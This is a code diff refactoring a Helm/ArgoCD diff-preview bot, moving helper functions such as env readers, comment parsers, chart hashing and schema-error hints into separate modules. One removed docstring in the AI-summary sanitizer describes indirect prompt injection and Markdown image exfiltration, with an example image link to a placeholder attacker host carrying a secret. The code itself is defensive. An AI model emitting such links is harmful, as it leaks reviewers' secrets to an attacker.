@@ -217,6 +217,43 @@ from identity import (  # environment identity and rename detection
     _split_renames_from_deletions,
     _same_env_identity,
 )
+from envcfg import (  # environment configuration readers (stdlib only)
+    _env_int,
+    _env_float,
+    _require_env,
+)
+from schema_errors import (  # render-failure explanation
+    _HELM_ERROR_MAX,
+    _SCHEMA_ERROR_MAX_LINES,
+    _cap_helm_error,
+    _render_reason,
+    _explain_schema_error,
+    _SCHEMA_VIOLATIONS_SHOWN,
+    _NULL_VIOLATION_RE,
+    _schema_fix_hints,
+    _missing_value_remedies,
+)
+from chart_identity import (  # chart tree digest and its memo
+    _CHART_TREE_MEMO_MAX,
+    _chart_tree_digest_memo,
+    _chart_tree_memo_lock,
+    _chart_tree_identity,
+    _hash_chart_tree,
+    _hash_value_files,
+    _find_chart_subdir,
+)
+from app_meta import (  # parsers for app, comment and config facts
+    _parse_diff_repos,
+    COMMENT_MARKER,
+    _extract_comment_sha,
+    _extract_status_token,
+    _extract_app_git_repo,
+    _extract_app_chart_info,
+)
+from ai_summary import (  # model-output hygiene
+    _sanitize_ai_summary,
+    _normalize_ai_markdown,
+)
 import io as _io
 import http.client as _http_client
 import socketserver
@@ -253,37 +290,6 @@ def _yaml_safe_load(text):
     """Parse a values/config YAML document with the preferred safe loader."""
     return yaml.load(text, Loader=_YAML_SAFE_LOADER)
 
-def _env_int(name: str, default: int) -> int:
-    """Parse an integer env var, falling back to default on any bad value.
-
-    A typo in ANY numeric env var (e.g. DIFF_WORKERS=sixteen) used to crash
-    the pod at import time with a raw traceback and no hint which variable
-    was at fault (bughunt N3). Now it logs a WARNING naming the variable,
-    the bad value, and the default used, and the pod starts normally.
-    """
-    raw = os.environ.get(name)
-    if raw is None:
-        return default
-    try:
-        return int(raw)
-    except ValueError:
-        print(f'WARNING: env var {name}="{raw}" is not a valid integer; '
-              f'using default {default}', file=sys.stderr, flush=True)
-        return default
-
-
-def _env_float(name: str, default: float) -> float:
-    """Parse a float env var, falling back to default on any bad value."""
-    raw = os.environ.get(name)
-    if raw is None:
-        return default
-    try:
-        return float(raw)
-    except ValueError:
-        print(f'WARNING: env var {name}="{raw}" is not a valid float; '
-              f'using default {default}', file=sys.stderr, flush=True)
-        return default
-
 
 # Running version, injected at image build (docker.yml passes the git tag as
 # the APP_VERSION build-arg -> ENV). Falls back to "dev" for local runs.
@@ -293,61 +299,12 @@ def _env_float(name: str, default: float) -> float:
 APP_VERSION = os.environ.get("APP_VERSION", "dev")
 
 
-def _require_env(*names):
-    """Exit with ONE clear message listing every missing required env var.
-
-    v2.5.19 (F2): the bare os.environ["X"] reads below fail-fast correctly but
-    greet a misconfigured deployment with a raw KeyError for a single var at a
-    time — fix one, redeploy, hit the next. This reports them all at once.
-    Returns None when all are present (also used by tests).
-    """
-    missing = [n for n in names if not os.environ.get(n)]
-    if missing:
-        msg = ("FATAL: missing required environment variable(s): "
-               + ", ".join(missing))
-        print(msg, file=sys.stderr, flush=True)
-        raise SystemExit(msg)
-    return None
-
-
 # Validate everything up front so a misconfigured deployment fails with one
 # actionable message instead of a KeyError cascade.
 _require_env("BB_USER", "BB_TOKEN", "ARGOCD_PASS")
 
 BB_WORKSPACE       = "appspace-cloud"
 
-# ── Multi-repo support (COPS-2507) ──────────────────────────────────────────
-# DIFF_REPOS: semicolon-separated repo entries, each "slug" or "slug:scopes"
-# where scopes is a |-separated list of path prefixes the service should
-# consider inside that repo (files outside every scope are invisible to
-# affected-app matching AND new-env detection). An entry with no scopes
-# means "whole repo" — every ArgoCD app in that repo is reachable, and any
-# tree the repo has that ArgoCD does NOT manage (e.g. a legacy-pipeline
-# path) is simply never matched by any app, so it stays silent on its own
-# without needing an explicit scope exclusion. Production runs both
-# acme-config-dev and acme-config-stage with no scope restriction (stage
-# gained azure/ coverage in v2.6.3, when pv-stage-corporate-b was onboarded
-# to ArgoCD as the first Azure spoke). Scopes remain available for a repo
-# that genuinely wants to exclude an in-repo tree the service should never
-# look at, regardless of whether ArgoCD apps exist there.
-#   DIFF_REPOS="acme-config-dev;acme-config-stage"
-#   DIFF_REPOS="acme-config-dev;acme-config-stage:gcp/|azure/"   (scoped form, still supported)
-# Default preserves the exact single-repo behavior this service always had.
-def _parse_diff_repos(raw: str) -> dict:
-    repos: dict = {}
-    for entry in raw.split(";"):
-        entry = entry.strip()
-        if not entry:
-            continue
-        slug, _, scope_raw = entry.partition(":")
-        slug = slug.strip()
-        if not slug:
-            continue
-        scopes = [s.strip() for s in scope_raw.split("|") if s.strip()]
-        repos[slug] = {"scopes": scopes}
-    if not repos:
-        repos["acme-config-dev"] = {"scopes": []}
-    return repos
 
 REPOS: dict = _parse_diff_repos(os.environ.get("DIFF_REPOS", "acme-config-dev"))
 # Transitional alias: single-repo code paths not yet repo-parameterized keep
@@ -382,56 +339,9 @@ JFROG_WEBHOOK_SECRET = os.environ.get("JFROG_WEBHOOK_SECRET", "")
 JFROG_DEDUP_WINDOW   = _env_int("JFROG_DEDUP_WINDOW", 15)
 # Human-readable name shown on the Bitbucket PR build status and comment header.
 STATUS_NAME        = "ACME Diff Preview"
-# Marker written into the footer of every comment we post. find_existing_comment
-# also matches the legacy "argocd-diff-preview" marker so comments created by
-# older pods are still updated in place (no duplicate comment) during rollout.
-COMMENT_MARKER     = "acme-diff-preview"
 _COMMENT_MARKERS   = ("acme-diff-preview", "argocd-diff-preview")
 
 
-def _extract_comment_sha(raw: str) -> str:
-    """Pull the 8-char PR sha out of a previously-posted comment's header.
-
-    BUG FIX: the header is written as "**Commit** `{sha}`" (bold markdown,
-    space before the backtick). The regex used to read it back was
-    r'Commit `([0-9a-f]{8})`' -- missing the "**" and the space -- so it
-    NEVER matched any comment this bot ever posted, in any version since
-    the header format was introduced. Every call returned "". That made
-    the cross-pod sha-dedup check (`comment_sha == pr_sha[:8]`) permanently
-    false, so a pod restart caused a full, unnecessary re-diff of every
-    currently open PR even when the posted comment already covered the
-    exact same commit. Confirmed empirically against real format_comment()
-    output before fixing; regression test constructs a REAL comment via
-    format_comment rather than a hand-typed string, so this class of
-    generated-vs-parsed drift cannot silently reappear.
-    """
-    m = re.search(r'\*\*Commit\*\*\s*`([0-9a-f]{8})`', raw)
-    return m.group(1) if m else ""
-
-
-def _extract_status_token(raw: str) -> str:
-    """Pull the machine-readable clean/permanent/transient token out of a
-    previously-posted comment's footer.
-
-    BUG FIX: the footer is written as "{COMMENT_MARKER} [{token}]" (an
-    em-dash and a space precede the marker, never a literal '['). The
-    regex used to read it back required a literal bracket before the marker --
-    requiring a literal '[' immediately before the marker -- so it NEVER
-    matched, in any version since the token was introduced (comment
-    itself said "1.9.1+"). Every call silently fell back to matching
-    human-readable substrings, which happened to reproduce the intended
-    behavior for "clean" and error/transient cases but not for "permanent"
-    errors (oci_not_found's status text also contains "Diff incomplete",
-    the substring used to detect *transient* problems) -- so a permanent,
-    unfixable error was retried forever instead of being left alone, and
-    in the pod-crash recovery path (fix_stuck_inprogress) a stuck-INPROGRESS
-    PR with a permanent error could be resolved to a false "SUCCESSFUL"
-    Bitbucket status instead of "FAILED". Confirmed empirically against
-    real format_comment() output across all 5 outcome scenarios before
-    fixing (clean, clean-with-diff, permanent, transient, error).
-    """
-    m = re.search(re.escape(COMMENT_MARKER) + r'\s+\[(clean|permanent|transient)\]', raw)
-    return m.group(1) if m else ""
 # BUILD_KEY is the STABLE Bitbucket build-status key. It MUST NOT change: the
 # key identifies the status row, so renaming it would leave the old status
 # orphaned and create a second row on every existing PR. Only STATUS_NAME (the
@@ -2544,54 +2454,6 @@ def path_map_for_repo(repo_slug):
     return _repo_path_maps.get(repo_slug, {})
 
 
-def _extract_app_git_repo(app):
-    """Return the config repo slug for an app's git source, or None.
-
-    The git source is the one WITHOUT a chart (multi-source apps: source-1 is
-    the git config repo providing value files via the $config alias). repoURL
-    formats seen live: git@bitbucket.org:appspace-cloud/acme-config-dev and
-    https://bitbucket.org/appspace-cloud/acme-config-dev(.git).
-    """
-    spec = app.get("spec", {})
-    srcs = spec.get("sources") or ([spec["source"]] if spec.get("source") else [])
-    for s in srcs:
-        if s.get("chart"):
-            continue
-        repo_url = (s.get("repoURL") or "").strip().rstrip("/")
-        if not repo_url:
-            continue
-        if repo_url.endswith(".git"):
-            repo_url = repo_url[:-4]
-        slug = repo_url.split("/")[-1]
-        # git@host:workspace/slug has the slug after the last '/', same rule.
-        return slug or None
-    return None
-
-
-def _extract_app_chart_info(app):
-    """Return (chart_name, targetRevision, registry_host, value_files) for an app's OCI source.
-
-    Apps are multi-source: source-1 is the git config repo (provides value files via $config
-    alias), source-2 is the OCI Helm chart. There are two registries:
-      helm-oci-dev.repo.appspace.com     — dev charts
-      helm-oci-release.repo.appspace.com — released/stable charts (stage, prod)
-    Both use the same credentials (OCI_USER / OCI_PASS env vars).
-
-    Returns (None, None, None, []) when no OCI source is found.
-    """
-    spec = app.get("spec", {})
-    srcs = spec.get("sources") or ([spec["source"]] if spec.get("source") else [])
-    for s in srcs:
-        chart = s.get("chart")
-        if chart:
-            repo_url = s.get("repoURL", "")
-            # Strip scheme if present (repoURL may be bare hostname or oci:// URL)
-            registry = repo_url.replace("oci://", "").split("/")[0]
-            value_files = s.get("helm", {}).get("valueFiles", [])
-            return chart, s.get("targetRevision"), registry, value_files
-    return None, None, None, []
-
-
 def _match_files_to_apps(changed_files, path_map):
     """Single O(files x paths) pass matching changed files to affected apps.
 
@@ -3462,120 +3324,6 @@ MAIN_RENDER_CACHE_SHADOW_RATE = _env_float(
 _CLEAR_MAIN_RENDER_ON_TIP_MOVE = False
 
 
-# COPS-2646: memo for the chart tree digest. _main_render_content_key runs
-# it twice per app and it walks and reads the whole chart every time, which
-# measured ~22ms per call on an appspace-micro-services-sized tree -- about
-# 15s of pure re-hashing on a 345-app fleet bump, on the GIL-bound side of
-# the workload. Charts are immutable once pulled, which is why
-# _helm_chart_cache and the per-chart pull locks exist at all.
-#
-# The key is a STAT fingerprint of the whole tree: every relative path with
-# its mtime and size, but without reading a single file body. That keeps the
-# memo self-invalidating -- there is no separate invalidation path to keep in
-# sync with the four places that evict the chart cache, and therefore no way
-# to forget one -- while still noticing every way a chart can change:
-#
-#   * a dev registry republishing under the same tag (_ensure_chart parks the
-#     stale tree aside and lands a fresh pull at the SAME path);
-#   * a file edited in place, which changes neither the directory inode nor
-#     its mtime. An earlier version of this memo keyed on the directory inode
-#     alone and missed exactly that -- caught by the COPS-2631 stage 3 test
-#     that pins "chart files change => content key changes".
-#
-# Serving a stale digest would key a fresh render to an old cache entry: a
-# wrong diff, the worst failure this service has. Statting is cheap next to
-# reading and hashing several MB of chart bodies, so the fingerprint keeps
-# most of the win and gives up none of the correctness.
-_CHART_TREE_MEMO_MAX = 256
-_chart_tree_digest_memo: "collections.OrderedDict" = collections.OrderedDict()
-_chart_tree_memo_lock = threading.Lock()
-
-
-def _chart_tree_identity(chart_path: str):
-    """Stat fingerprint of the tree: paths + mtimes + sizes, no file reads.
-
-    Returns None when the tree cannot be walked, which forces the caller to
-    fall through to a full hash rather than trust a partial fingerprint.
-    """
-    h = hashlib.sha256()
-    try:
-        for root, dirs, files in os.walk(chart_path):
-            dirs.sort()
-            for name in sorted(files):
-                path = os.path.join(root, name)
-                rel = os.path.relpath(path, chart_path).replace(os.sep, "/")
-                st = os.stat(path)
-                h.update(rel.encode("utf-8", "surrogateescape"))
-                h.update(f"\0{st.st_mtime_ns}\0{st.st_size}\0".encode())
-    except OSError:
-        return None
-    return (chart_path, h.hexdigest())
-
-
-def _hash_chart_tree(chart_path: str) -> bytes:
-    """Digest of the on-disk chart tree (files, relative paths, contents).
-
-    Empty / missing tree hashes to a fixed sentinel so a missing chart becomes
-    a cache miss rather than a KeyError. That sentinel is deliberately NOT
-    memoized: an in-flight pull is about to populate the path, and pinning
-    "missing" for it would outlive the pull.
-    """
-    h = hashlib.sha256()
-    if not chart_path or not os.path.isdir(chart_path):
-        h.update(b"missing-chart")
-        return h.digest()
-
-    ident = _chart_tree_identity(chart_path)
-    if ident is not None:
-        with _chart_tree_memo_lock:
-            hit = _chart_tree_digest_memo.get(ident)
-            if hit is not None:
-                _chart_tree_digest_memo.move_to_end(ident)
-                return hit
-    for root, dirs, files in os.walk(chart_path):
-        dirs.sort()
-        for name in sorted(files):
-            path = os.path.join(root, name)
-            rel = os.path.relpath(path, chart_path).replace(os.sep, "/")
-            h.update(rel.encode("utf-8", "surrogateescape"))
-            h.update(b"\0")
-            try:
-                with open(path, "rb") as f:
-                    while True:
-                        chunk = f.read(1024 * 1024)
-                        if not chunk:
-                            break
-                        h.update(chunk)
-            except OSError:
-                h.update(b"unreadable")
-            h.update(b"\0")
-    digest = h.digest()
-
-    # Re-stat before storing. If the directory changed identity while the
-    # walk was running (a re-pull landing underneath us), the digest we just
-    # computed may mix two trees, so it is not safe to memoize against
-    # either identity. Dropping it costs one re-hash; keeping it could cost
-    # a wrong diff. A duplicate computation under a race is harmless.
-    if ident is not None and _chart_tree_identity(chart_path) == ident:
-        with _chart_tree_memo_lock:
-            _chart_tree_digest_memo[ident] = digest
-            _chart_tree_digest_memo.move_to_end(ident)
-            while len(_chart_tree_digest_memo) > _CHART_TREE_MEMO_MAX:
-                _chart_tree_digest_memo.popitem(last=False)
-    return digest
-
-
-def _hash_value_files(vals: dict) -> bytes:
-    """Digest of resolved value-file contents in helm -f order."""
-    h = hashlib.sha256()
-    for path, body in (vals or {}).items():
-        h.update(str(path).encode("utf-8", "surrogateescape"))
-        h.update(b"\0")
-        h.update((body or "").encode("utf-8", "surrogateescape"))
-        h.update(b"\0")
-    return h.digest()
-
-
 def _main_render_content_key(chart_path, release, namespace, vals) -> str:
     """Content key for a main-side helm render (COPS-2631).
 
@@ -4259,27 +4007,6 @@ def _ensure_chart(registry: str, chart: str, version: str) -> str:
         return path
 
 
-def _find_chart_subdir(chart_dir: str) -> str:
-    """Return the chart directory inside chart_dir (helm --untar creates a subdir).
-
-    Prefers the subdirectory that contains a Chart.yaml to avoid picking an
-    arbitrary one when untaring produces multiple dirs (e.g. chart + dependency).
-    """
-    try:
-        subdirs = [d for d in os.listdir(chart_dir)
-                   if os.path.isdir(os.path.join(chart_dir, d))]
-        if not subdirs:
-            return chart_dir
-        # Pick the subdir that contains Chart.yaml (the chart root)
-        for d in subdirs:
-            if os.path.isfile(os.path.join(chart_dir, d, "Chart.yaml")):
-                return os.path.join(chart_dir, d)
-        # Fallback: first subdir (as before)
-        return os.path.join(chart_dir, subdirs[0])
-    except OSError:
-        return chart_dir
-
-
 # Cap on pulled chart versions kept on the pod's ephemeral disk. Each mass
 # version-bump pulls a couple of versions per chart; over a long pod lifetime
 # these accumulate and can fill node ephemeral storage (not bounded by the
@@ -4843,29 +4570,6 @@ def _helm_template(chart_path: str, release: str, namespace: str,
         if r.returncode != 0:
             return None, _cap_helm_error(r.stderr or r.stdout or "helm template failed")
         return r.stdout, None
-
-
-# COPS-2564: a flat 400-char cap used to be applied to helm stderr right here,
-# before anything parsed it. That is fine for a one-line render error, but a
-# schema failure is a LIST: acme-config-prod PR 3837 produced 53 violations and
-# the comment showed four and a half of them, cut mid path
-# ("definitions/a"), so the reader could not tell which services were broken.
-# Keep the violation lines whole (they are short, one per line, and the whole
-# point of the message) and bound everything else as before.
-_HELM_ERROR_MAX = 400
-_SCHEMA_ERROR_MAX_LINES = 80
-
-
-def _cap_helm_error(err: str) -> str:
-    """Bound a helm failure for storage, without cutting a violation list."""
-    err = err or ""
-    if "- at '" not in err:
-        return err[:_HELM_ERROR_MAX]
-    lines = err.splitlines()
-    kept = lines[:_SCHEMA_ERROR_MAX_LINES]
-    if len(lines) > _SCHEMA_ERROR_MAX_LINES:
-        kept.append(f"- ... and {len(lines) - _SCHEMA_ERROR_MAX_LINES} more lines")
-    return "\n".join(kept)
 
 
 # --- Wiped microservices.definitions guard (COPR-31637) ---------------------
@@ -5932,126 +5636,6 @@ def _diff_manifests(main_yaml: str, pr_yaml: str) -> str:
         _parse_manifest_resources(main_yaml),
         _parse_manifest_resources(pr_yaml)
     )
-
-
-def _render_reason(render_err: str) -> str:
-    """Classify a helm render error into a REASON_* code (FIX F, v2.4.9).
-
-    A `helm template` failure caused by a value file that is not parseable
-    YAML gets its own reason so the PR comment can tell the author to fix the
-    YAML syntax, instead of the generic "helm template failed to render the
-    chart with these values" which points them at chart values by mistake.
-    Everything else stays REASON_RENDER.
-    """
-    e = (render_err or "").lower()
-    # COPS-2554: match Helm's own message-independent SIGNATURE for a
-    # template `required()` failure ("execution error at (<template>:<line>):
-    # <message>") instead of guessing keywords from <message>, which chart
-    # authors write however they like. Live PR 3823 broke on a chart's own
-    # custom message ("Missing Image Tag on => platform") that contained none
-    # of the previously-matched phrases and fell through to generic
-    # REASON_RENDER: retried 5 times for a failure that can never resolve on
-    # retry, then showed only "diff unavailable" with the real cause hidden.
-    # Auditing this chart's own templates turned up more messages the old
-    # keyword list silently missed the same way ("Cloud instance not found
-    # for this deployment", "A valid appspace.prefix entry required!"). The
-    # nil-pointer shape (accessing a field with no required() guard at all)
-    # keeps its own separate check since it has a different Go-level phrase.
-    if "execution error at (" in e or "nil pointer evaluating" in e:
-        return REASON_MISSING_REQUIRED
-    # COPS-2554: values.schema.json validation. Same class of bug -- this
-    # chart ships a schema, and a violation is exactly as deterministic and
-    # actionable as a missing required() value, but was not classified at
-    # all before, so it too fell into the generic bucket.
-    if "values don't meet the specifications of the schema" in e:
-        return REASON_SCHEMA_INVALID
-    if ("error converting yaml" in e or "did not find expected" in e
-            or "could not find expected" in e or "mapping values are not allowed" in e
-            or "yaml: line" in e or "found character that cannot start" in e
-            or "yaml:" in e and "unmarshal" in e):
-        return REASON_INVALID_YAML
-    return REASON_RENDER
-
-
-def _explain_schema_error(err: str) -> list:
-    """Break a Helm values.schema.json failure into one violation per line.
-
-    COPS-2554: Helm reports every schema violation in one multi-line stderr
-    block. Left as raw text (or worse, collapsed to the generic "diff
-    unavailable" message) an operator has to find and parse it themselves.
-    Each "- ..." line IS already the specific, actionable violation, so this
-    only needs to extract and re-list them, same "one thing per line"
-    principle as the required-value remedies.
-    """
-    lines = [l.strip() for l in (err or "").splitlines()]
-    violations = [l[1:].strip() for l in lines if l.startswith("-")]
-    if not violations:
-        return [f"> {(err or 'no error output').splitlines()[0][:300]}"]
-    # COPS-2564: cap by COUNT, never by characters. PR 3837 hit 53 violations
-    # and a character cap cut the last one mid path, which reads like a
-    # rendering bug and hides how many were left. Ten is enough to see the
-    # pattern; the remainder is stated so nobody assumes the list is complete.
-    out = [f"> {v}" for v in violations[:_SCHEMA_VIOLATIONS_SHOWN]]
-    extra = len(violations) - _SCHEMA_VIOLATIONS_SHOWN
-    if extra > 0:
-        out.append(f"> *... and {extra} more violation(s) of the same kind*")
-    return out
-
-
-_SCHEMA_VIOLATIONS_SHOWN = 10
-_NULL_VIOLATION_RE = re.compile(r"at '([^']+)': got null, want (\w+)")
-
-
-def _schema_fix_hints(err: str) -> list:
-    """Extra, cause-specific advice under a schema failure.
-
-    Generic advice ("correct each value listed above") is useless for the one
-    cause we keep hitting: a key whose entire body was removed or commented
-    out is read by YAML as null, and the schema then rejects it. That is what
-    broke acme-config-prod PR 3837 (53 services) and, in a different file,
-    COPR-31637. The fix is an explicit empty map -- and under
-    microservices.definitions, deleting the key instead is actively dangerous,
-    because deployment/vpa/pdb/iamPolicyMember all range over that map, so a
-    missing key deletes the microservice from the environment.
-    """
-    nulls = _NULL_VIOLATION_RE.findall(err or "")
-    if not nulls:
-        return []
-    hints = [
-        f"> **Why:** {len(nulls)} of these are `null`, which is what YAML "
-        f"gives a key whose body was deleted or commented out.",
-        "> **Fix:** write an explicit empty map to keep the entry with pure "
-        "chart defaults, for example `myservice: {}`.",
-    ]
-    if any("/microservices/definitions/" in p for p, _ in nulls):
-        hints.append(
-            "> \u26a0\ufe0f Do **not** delete the key instead: the chart "
-            "renders one microservice per entry under "
-            "`microservices.definitions`, so removing it deletes that "
-            "microservice from the environment.")
-    return hints
-
-
-def _missing_value_remedies() -> list:
-    """The remedies for a MISSING REQUIRED VALUE block, one per line.
-
-    COPS-2548: these used to be a single long sentence that crammed two
-    unrelated pieces of advice together ("define it in customer.yaml or a
-    parent config.yaml" and "if the chart version changed..."), which the
-    renderer showed as one wall of text. An operator had to untangle it to
-    work out what to actually do. Separate lines, most likely cause first.
-    """
-    return [
-        "> **Fix:** add the missing value to this environment's "
-        "`customer.yaml`, or to the `config.yaml` of its cohort or ring if "
-        "every environment at that level needs it.",
-        "> If this PR moved the environment to a new folder, check that the "
-        "new parent `config.yaml` carries what the old one did.",
-        "> If this PR changed the chart version, the new chart may require "
-        "values the old one did not.",
-    ]
-
-
 
 
 # Memoizes _rename_identity_confirmed so the SAME (old, new, main_sha, pr_sha)
@@ -8018,56 +7602,6 @@ def _gcp_access_token() -> str:
         exp = resp.get("expires_in", "?")
         log(f"[AI] Token refreshed (valid for {exp}s)", "DEBUG")
         return _gcp_token
-
-def _sanitize_ai_summary(text: str) -> str:
-    """Strip active/exfiltration Markdown from model output before it is
-    posted as a PR comment.
-
-    v2.5.19 (R6, community-research round): the AI summary is model output
-    built from untrusted rendered manifest values, which makes it an indirect
-    prompt-injection sink. The documented "Markdown image exfiltration"
-    channel (Checkmarx, against Copilot Chat and Gemini) is zero-click: a
-    model coaxed into emitting ![x](https://attacker/?d=<secret>) makes the
-    reviewer's browser fetch that URL on render. Cross-vendor "Comment-and-
-    Control" research showed AI review bots posting attacker-chosen content
-    into PR comments. We do not trust the model not to be steered, so we
-    strip, from its output only (never from our deterministic head line):
-      - Markdown images ![alt](url) -> alt text kept, image dropped
-      - raw HTML tags (img/picture/script/style/anchors/comments)
-      - autolinked bare URLs left as text but de-linked from any image use
-      - triple-backtick fences (the model must not open its own fences)
-    The summary is advisory prose; none of these belong in it, so removing
-    them cannot lose diff information.
-    """
-    if not text:
-        return text
-    t = text
-    # Markdown image -> keep alt text, drop the URL entirely.
-    t = re.sub(r'!\[([^\]]*)\]\([^)]*\)', r'\1', t)
-    # HTML comments (hidden instructions) and any raw tags.
-    t = re.sub(r'<!--.*?-->', '', t, flags=re.DOTALL)
-    t = re.sub(r'</?[A-Za-z][^>]*>', '', t)
-    # The model must never open a code fence in an advisory summary.
-    t = _fence_safe(t)
-    return t.strip()
-
-
-def _normalize_ai_markdown(text: str) -> str:
-    """Ensure the AI output renders correctly in Bitbucket Markdown.
-
-    Bitbucket requires a blank line before a bullet list; without it
-    the items render as inline text instead of a proper list.
-    The model outputs single-newline separators which look fine in
-    plain text but collapse into a wall of text in Bitbucket.
-    """
-    # Blank line before the first list item following non-list text.
-    t = re.sub(r'([^\n])\n([ \t]*[-*] )', r'\1\n\n\2', text)
-    # Blank line before the Critical/No-critical flag line.
-    t = re.sub(r'\n([⚠✅][^⚠✅])', r'\n\n\1', t)
-    return t.strip()
-
-
-
 
 
 def _precomputed_facts_note(results: dict) -> str:
